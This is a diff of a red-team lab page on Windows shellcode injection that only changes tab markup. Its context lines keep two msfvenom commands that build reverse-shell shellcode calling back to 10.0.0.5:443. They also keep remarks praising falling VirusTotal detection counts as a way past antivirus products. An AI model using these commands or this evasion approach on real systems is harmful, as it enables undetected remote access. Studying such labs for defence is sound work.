@@ -64,8 +64,8 @@ Let's do something a bit more custom - build a binary from the previous lab [Cre
 msfvenom -p windows/shell_reverse_tcp LHOST=10.0.0.5 LPORT=443 -f c
 ```
 
-{% code-tabs %}
-{% code-tabs-item title="inject-local-process.cpp" %}
+{% tabs %}
+{% tab title="inject-local-process.cpp" %}
 ```cpp
 #include "stdafx.h"
 #include "Windows.h"
@@ -105,8 +105,8 @@ int main()
     return 0;
 }
 ```
-{% endcode-tabs-item %}
-{% endcode-tabs %}
+{% endtab %}
+{% endtabs %}
 
 This time [VirusTotal](https://www.virustotal.com/#/file/f4dfceb473a878a3751513bacb4d44ee460391ce1a668edb5337d4859e767335/detection) detections dropped dramatically to 8/68:
 
@@ -120,8 +120,8 @@ The above binaries were all for a x86 architecture. Let's try generating the she
 msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.0.0.5 LPORT=443 -f c -b \x00\x0a\x0d
 ```
 
-{% code-tabs %}
-{% code-tabs-item title="inject-local-process.cpp" %}
+{% tabs %}
+{% tab title="inject-local-process.cpp" %}
 ```cpp
 #include "stdafx.h"
 #include "Windows.h"
@@ -171,8 +171,8 @@ int main()
     return 0;
 }
 ```
-{% endcode-tabs-item %}
-{% endcode-tabs %}
+{% endtab %}
+{% endtabs %}
 
 [VirusTotal](https://www.virustotal.com/#/file/d1431f479724822d6ccf8684a99598d966a9b5a964e7bd3886308a0217dea712/detection) now only shows **3/68** detections, which is a great improvement that enables us bypassing most of the popular antivirus vendors:
 
